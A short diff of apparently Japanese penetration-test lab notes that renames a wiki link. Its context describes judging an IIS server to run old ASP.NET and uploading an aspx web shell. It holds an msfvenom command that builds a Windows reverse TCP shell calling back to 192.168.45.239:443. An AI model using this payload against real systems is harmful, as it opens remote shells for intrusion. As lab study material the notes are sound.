@@ -44,7 +44,7 @@ drwxrwxrwx 1 ftp ftp               0 Nov 29  2022 umbraco
 192.168.1.20 tokyo07.skylark.com skylark.com
 ```
 
-3. umbracoは`/bin/Debug/net6.0/publish`があり、Net 6+の比較的新しい環境で動作しており、一方でIISは直でweb rootであったため、ASP.net framework（古い）と推定し、aspx ペイロードをアップ（[[Web Shell#ASP / ASP.NET (IIS)]]）
+3. umbracoは`/bin/Debug/net6.0/publish`があり、Net 6+の比較的新しい環境で動作しており、一方でIISは直でweb rootであったため、ASP.net framework（古い）と推定し、aspx ペイロードをアップ（[[WebShell#ASP / ASP.NET (IIS)]]）
 ```sh
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.239 LPORT=443 -f aspx -o reverse.aspx
 ```
